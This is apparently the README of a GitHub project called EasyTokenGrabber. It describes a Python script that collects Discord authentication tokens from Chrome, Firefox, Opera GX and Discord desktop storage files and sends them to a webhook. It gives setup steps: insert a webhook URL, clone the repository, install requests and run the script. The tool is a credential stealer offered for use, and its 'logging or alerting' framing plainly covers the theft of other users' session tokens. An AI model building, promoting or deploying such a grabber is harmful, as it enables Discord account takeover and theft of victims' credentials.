# Discord Token Extractor and Logger

## Description

This Python script extracts Discord tokens from local storage files across various browsers and the Discord desktop application. It searches for tokens stored in `.ldb` and `.log` files and sends any found tokens to a specified Discord webhook for centralized logging or alerting.

## Supported Platforms

- **Google Chrome**
- **Mozilla Firefox**
- **Discord Desktop App**
- **Opera GX**

## Features

- **Multi-Browser Support**: Extracts tokens from multiple browsers and the Discord desktop application.
- **File Handling**: Searches through `.ldb` and `.log` files.
- **Webhook Integration**: Sends extracted tokens to a Discord webhook.
- **Error Handling**: Reports any issues encountered during token extraction or webhook interaction.

## Usage

1. **Update Webhook URL**: Replace the placeholder URL in the script with your actual Discord webhook URL.

    ```python
    webhook_url = 'https://discord.com/api/webhooks/your_webhook_id/your_webhook_token'
    ```

2. **Run the Script**: Execute the script using Python.

    ```bash
    python main.py
    ```

## Installation

1. **Clone the Repository**:

    ```bash
    git clone https://github.com/zentonik/EasyTokenGrabber.git
    cd EasyTokenGrabber
    ```

2. **Install Dependencies**:

    Ensure Python is installed, then install the required dependencies:

    ```bash
    pip install requests
    ```
